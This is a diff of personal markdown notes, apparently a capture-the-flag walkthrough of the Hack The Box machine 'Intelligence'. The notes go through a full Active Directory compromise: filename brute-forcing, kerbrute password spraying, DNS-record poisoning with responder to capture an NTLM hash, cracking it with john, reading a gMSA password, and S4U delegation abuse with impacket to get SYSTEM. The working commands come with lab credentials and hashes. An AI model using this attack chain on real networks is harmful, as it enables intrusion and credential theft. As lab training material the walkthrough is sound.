@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+```bash
 nmap -sV -sC -vv 10.10.10.248
 nmap -sU --top-ports=10 -vv 10.10.10.248
 
@@ -127,32 +127,32 @@ Host script results:
 ```
 ## Directory Enumeration
 - Gobuster:
-	- Directory
-		```bash
+- Directory
+```bash
 gobuster dir -u http://10.10.10.248 dns --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.root
 
 ---OUTPUT---
 /documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/documents/]
 /Documents            (Status: 301) [Size: 153] [--> http://10.10.10.248/Documents/]
 ```
-		- Next Directory
-			- tried documents but nothing
-	- VHost :
-		```bash
+- Next Directory
+- tried documents but nothing
+- VHost :
+```bash
 
 ```
 - Ffuf : nothing
-	```bash
+```bash
 ffuf
 ```
 ## Website Enumeration and Initial Foothold
 ### Direct
 - Basic web page but **there are 2 download files**
-	- we see the file name in the url is in the format `&Y-&M-&d-upload.pdf` from 1st jan 2020
-		- Maybe there are more files like that
+- we see the file name in the url is in the format `&Y-&M-&d-upload.pdf` from 1st jan 2020
+- Maybe there are more files like that
 - We pass this command in bash to pass a simple code to generate the string to brute force.
-	- using the date command we can create a tiny script generating a list of filenames we can enumerate:
-		```bash
+- using the date command we can create a tiny script generating a list of filenames we can enumerate:
+```bash
 date
 date --date="1 day ago" 
 date --date="1 day ago" +%Y-%m-%d
@@ -162,8 +162,8 @@ date --date="1929 day ago" +%Y-%m-%d-upload.pdf #currently to 1 Jan 2020
 date --date="1564 day ago" +%Y-%m-%d-upload.pdf #currently to 31 Dec 2020
 
 ```
-	- We will have a date for the whole year and we wget the file from the website:
-		```bash
+- We will have a date for the whole year and we wget the file from the website:
+```bash
 ---CREATE-LIST---
 for i in $(seq 1564 1929); do date --date="$i days ago"  +%Y-%m-%d-upload.pdf; done > brutepdf.txt
 ---TEST-BEFORE-EXPLOIT---
@@ -171,9 +171,9 @@ for i in $(cat ../brutepdf.txt); do echo http://10.10.10.248/documents/$i; done 
 ---EXPLOIT---
 for i in $(cat ../brutepdf.txt); do wget http://10.10.10.248/documents/$i; done
 ```
-		- We download the files.
-	- We then use exiftool and find there is an entry Creator with a username so we create a list of users with this:
-		```bash
+- We download the files.
+- We then use exiftool and find there is an entry Creator with a username so we create a list of users with this:
+```bash
 exiftool *.pdf
 ---RELEVANT-OUTPUT---
 Creator                         : Jason.Patterson
@@ -181,9 +181,9 @@ Creator                         : Jason.Patterson
 exiftool * | grep "Creator"
 exiftool * | grep "Creator" | awk '{print $3}' > userlist.txt
 ```
-		- Awk is to select the 3rd column form the entry (first two being Creator and :)
+- Awk is to select the 3rd column form the entry (first two being Creator and :)
 - We install kerbrute to enumerate if any users exist:
-	```bash
+```bash
 ./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb userlist.txt
 
 ---OUTPUT---
@@ -230,9 +230,9 @@ Version: dev (9cfb81e) - 04/14/25 - Ronnie Flathers @ropnop
 
 ```
 - Now we need a password.
-	- We convert the pdf to text files so we can grep them.
-		- This requires pdftotext to be installed:
-			```bash
+- We convert the pdf to text files so we can grep them.
+- This requires pdftotext to be installed:
+```bash
 for i in $(ls); do pdftotext $i; done
 cat *.txt | grep "password" -B5 -A5 # 5 lines before and after
 
@@ -262,7 +262,7 @@ After logging in please change your password as soon as possible.
 
 ```
 - We then use kerbrute to password spray:
-	```bash
+```bash
 sudo ./kerbrute_linux_amd64 passwordspray --dc 10.10.10.248 -d intelligence.htb userlist.txt NewIntelligenceCorpUser9876
 
 ---OUTPUT---
@@ -282,9 +282,9 @@ Version: dev (9cfb81e) - 04/13/25 - Ronnie Flathers @ropnop
 2025/04/13 22:39:42 >  Done! Tested 84 logins (2 successes) in 0.675 seconds
 
 ```
-	- We get credentials for user Tiffany.Molina
+- We get credentials for user Tiffany.Molina
 - We test with smbclient (winrm didnt work):
-	```bash
+```bash
 smbclient -U 'Tiffany.Molina' -L //10.10.10.248/Users
 Password for [WORKGROUP\Tiffany.Molina]: NewIntelligenceCorpUser9876
 
@@ -301,14 +301,14 @@ Password for [WORKGROUP\Tiffany.Molina]: NewIntelligenceCorpUser9876
 
 ```
 - We try to connect to Users with our credentials:
-	```bash
+```bash
 smbclient //10.10.10.248/Users -U Tiffany.Molina --password='NewIntelligenceCorpUser9876'
 >dir
 
 ```
-	- We see it is basically the C:\users location.
-		- We can access Tiffany's folder and so e navigate to Desktop and grab the user flag.
-			```bash
+- We see it is basically the C:\users location.
+- We can access Tiffany's folder and so e navigate to Desktop and grab the user flag.
+```bash
 cd Tiffany.Molina\Desktop\
 more user.txt
 -OR-
@@ -319,31 +319,31 @@ cat user.txt # form local machine
 ## BloodHound
 - At this point we can also grab the bloodhound files we require from our target for better analysis.
 - We grab the required files from target to add to bloodhound:
-	```bash
+```bash
 bloodhound-python --dns-tcp -ns 10.10.10.248 -d intelligence.htb -u 'Tiffany.Molina' -p 'NewIntelligenceCorpUser9876' -c all
 ```
-	- We add the files to bloodhound
+- We add the files to bloodhound
 - We mark Tiffany as owned
-	- But we don't see any path from tiffany
+- But we don't see any path from tiffany
 - In our SMB client however we did see the user Ted.Graves
-	- Maybe we can compromise Ted which is a high value target that could lead us to another high value target SVC_INT$@INTELLIGENCE.HTB
-		- This is probably a machine account (cant brute force pwd, too big)
-		- it is a Group Managed Service Account (GMS)
-		- We also see a user Laura.Lee who might have similar privileges to Ted and they are both a member of IT Support group.
-			- This group I believe can read the pwd of SVC_INT$ user which has a link to the DC
+- Maybe we can compromise Ted which is a high value target that could lead us to another high value target SVC_INT$@INTELLIGENCE.HTB
+- This is probably a machine account (cant brute force pwd, too big)
+- it is a Group Managed Service Account (GMS)
+- We also see a user Laura.Lee who might have similar privileges to Ted and they are both a member of IT Support group.
+- This group I believe can read the pwd of SVC_INT$ user which has a link to the DC
 - We continue enumerating with BloodHound at each step
 ### Lateral Movement
 ### Back to SMB Share
 - We also see a powershell application in IT share
-	```bash
+```bash
 smbclient //10.10.10.248/IT -U Tiffany.Molina --password='NewIntelligenceCorpUser9876'
 >dir
 
 ---OUTPUT---
   downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021
 ```
-	- we get it
-		```bash
+- we get it
+```bash
 get downdetector.ps1
 exit
 cat downdetector.ps1
@@ -360,15 +360,15 @@ Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Grave
 } catch {}
 }
 ```
-		- Runs every 5 min
-		- Checks the DNS entry and gets any host with a name starting with web.
-			- Then it invokes a web request with **Default Credentials** to that host and if it fails to respond with 200 OK, a messag is sent to Ted Graces one of our high value targets.
+- Runs every 5 min
+- Checks the DNS entry and gets any host with a name starting with web.
+- Then it invokes a web request with **Default Credentials** to that host and if it fails to respond with 200 OK, a messag is sent to Ted Graces one of our high value targets.
 - In AD due to dynamic DNS (if not hardened) almost any authenticated user can create a domain entry.
-	- When you get a DHCP request, the machine updates the AD to create reverse lookup and all
+- When you get a DHCP request, the machine updates the AD to create reverse lookup and all
 - **NEW TOOL** : We can do this with a tool called dnstool. It will create a DNS entry from our machine to our target. We will then listen on that port on our network interface to grab the credentials:
-	- part of krbrelayx as its part of a relay attack
-		- https://github.com/dirkjanm/krbrelayx
-		```bash
+- part of krbrelayx as its part of a relay attack
+- https://github.com/dirkjanm/krbrelayx
+```bash
 python3 dnstool.py -u "intelligence\Tiffany.Molina" -p "NewIntelligenceCorpUser9876" -r webrocknrj.intelligence.htb -a add -t A -d 10.10.14.25 10.10.10.248
 
 ---OUTPUT---
@@ -378,9 +378,9 @@ python3 dnstool.py -u "intelligence\Tiffany.Molina" -p "NewIntelligenceCorpUser9
 [-] Adding new record
 [+] LDAP operation completed successfully
 ```
-		- To test we can listen on port 80 using netcat and we should get some response in a few minutes
-		- We can also test with nslookup:
-			```bash
+- To test we can listen on port 80 using netcat and we should get some response in a few minutes
+- We can also test with nslookup:
+```bash
 nslookup
 server 10.10.10.248
 webrocknrj.intelligence.htb
@@ -393,8 +393,8 @@ Server:         10.10.10.248
 Address:        10.10.10.248#53
 
 ```
-		- If responder doesn't work we can try msfdb
-			```bash
+- If responder doesn't work we can try msfdb
+```bash
 sudo msfdb run
 use auxilary/server/capture/http ntlm
 auxilary(server/capture/http ntlm) > show options
@@ -408,12 +408,12 @@ auxilary(server/capture/http ntlm) > show options # to check
 auxilary(server/capture/http ntlm) > set JOHNPWFILE intelligence
 run
 ```
-		- If didn't set in verbose mode can also check for some activity here incase msfconsole causes an error we don't see:
-			```bash
+- If didn't set in verbose mode can also check for some activity here incase msfconsole causes an error we don't see:
+```bash
 sudo tcpdump -i tun0 port 80 -n -vvv
 ```
-	- If we check our responder entry:
-		```bash
+- If we check our responder entry:
+```bash
 curl 10.10.14.25 -v
 
 ---OUTPUT---
@@ -426,9 +426,9 @@ curl 10.10.14.25 -v
 < WWW-Authenticate: NTLM
 < Content-Length: 1264
 ```
-		- We see we request to authenticate with NTLM so we are trying to capture this authentication.
-	- We then use a responder to listen on our network interface and end up grabbing Ted Grave's hash
-		```bash
+- We see we request to authenticate with NTLM so we are trying to capture this authentication.
+- We then use a responder to listen on our network interface and end up grabbing Ted Grave's hash
+```bash
 sudo responder -I tun0
 
 ---OUTPUT---
@@ -438,24 +438,24 @@ sudo responder -I tun0
 [HTTP] NTLMv2 Username : intelligence\Ted.Graves
 [HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:0dd86db73709aaff:73497C69226067BF04C9F446B5577914:0101000000000000AB203FD28CADDB010DC97C965B44F6920000000002000800320050003700540001001E00570049004E002D00480033005100480031003400580044005700560056000400140032005000370054002E004C004F00430041004C0003003400570049004E002D00480033005100480031003400580044005700560056002E0032005000370054002E004C004F00430041004C000500140032005000370054002E004C004F00430041004C000800300030000000000000000000000000200000712A96C3BE13FE3C26B79F006BF4285791397C463F6054A137DBB319FA780BF70A001000000000000000000000000000000000000900400048005400540050002F0077006500620072006F0063006B006E0072006A002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
 ```
-	- We copy the hash into a file and attempt to crack it with john:
-		```bash
+- We copy the hash into a file and attempt to crack it with john:
+```bash
 vi tedgraves.hash # copy hash here
 john tedgraves.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
 ---OUTPUT---
 Mr.Teddy         (Ted.Graves)
 ```
-		- We get Ted's credentials and can test it out with smbclient
-			- We don't find anything interesting in Ted's Users folder.
+- We get Ted's credentials and can test it out with smbclient
+- We don't find anything interesting in Ted's Users folder.
 ## Privilege Escalation
 - We then check bloodhound:
-	- We mark Ted as Owned and check the Shortest Path to Domain Admins
-		- We see Ted is a part of ITSupport Group which can read the GMS Password of user SVC_INT$
+- We mark Ted as Owned and check the Shortest Path to Domain Admins
+- We see Ted is a part of ITSupport Group which can read the GMS Password of user SVC_INT$
 - We use gMSADumper.py
-	- We clone the repo: https://github.com/micahvandeusen/gMSADumper.git
-	- Then we pass the command :
-		```bash
+- We clone the repo: https://github.com/micahvandeusen/gMSADumper.git
+- Then we pass the command :
+```bash
 python gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
 
 ---OUTPUT---
@@ -465,10 +465,10 @@ svc_int$:::b05dfb2636385604c6d36b0ca61e35cb
 svc_int$:aes256-cts-hmac-sha1-96:77a2141a0d0b64a8858ff6eac44a82cb388161b70a0ee4557566f4a6fc2091aa
 svc_int$:aes128-cts-hmac-sha1-96:e9b3d6e223cd226f04fb91aaf759765d
 ```
-	- We obtain the hash of SVC_INT$
-		- `b05dfb2636385604c6d36b0ca61e35cb`
-	- We try impacket psexec into it but we get authentified but nothing else:
-		```bash
+- We obtain the hash of SVC_INT$
+- `b05dfb2636385604c6d36b0ca61e35cb`
+- We try impacket psexec into it but we get authentified but nothing else:
+```bash
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:b05dfb2636385604c6d36b0ca61e35cb 'svc_int$@10.10.10.248'
 
 ---OUTPUT---
@@ -483,10 +483,10 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [-] share 'Users' is not writable.
 ```
 - On checking BloodHound again we see SVC_INT$ has AllowedToDelegate Privileges on our DC.
-	- The constrained delegation primitive allows a principal to authenticate as any user to specific services on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host
-		- This is as long as the user is not in the Protected Users security group.
+- The constrained delegation primitive allows a principal to authenticate as any user to specific services on the target computer. That is, a node with this privilege can impersonate any domain principal (including Domain Admins) to the specific service on the target host
+- This is as long as the user is not in the Protected Users security group.
 - We can exploit this via impacket-getST tool:
-	```bash
+```bash
 impacket-getST -spn 'WWW/dc.intelligence.htb' -impersonate 'Administrator' 'intelligence.htb/svc_int$' -hashes :b05dfb2636385604c6d36b0ca61e35cb
 
 ---OUTPUT---
@@ -507,10 +507,10 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting S4U2Proxy
 [*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 ```
-	- Similar to Silver Ticket but it's not...it's S4U2Proxy
-	- We get a ticket impersonating Adminsitrator
-		- We can assign this as the KRB5CCNAME and try to login using this ticket using psexec or wmiexec (it should use the KRB5CCNAME we exported):
-			```bash
+- Similar to Silver Ticket but it's not...it's S4U2Proxy
+- We get a ticket impersonating Adminsitrator
+- We can assign this as the KRB5CCNAME and try to login using this ticket using psexec or wmiexec (it should use the KRB5CCNAME we exported):
+```bash
 export KRB5CCNAME=Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
 impacket-psexec -k -no-pass dc.intelligence.htb
 
@@ -531,4 +531,4 @@ Microsoft Windows [Version 10.0.17763.1879]
 C:\Windows\system32> whoami
 nt authority\system
 ```
-		- We log in as Administrator user.
+- We log in as Administrator user.
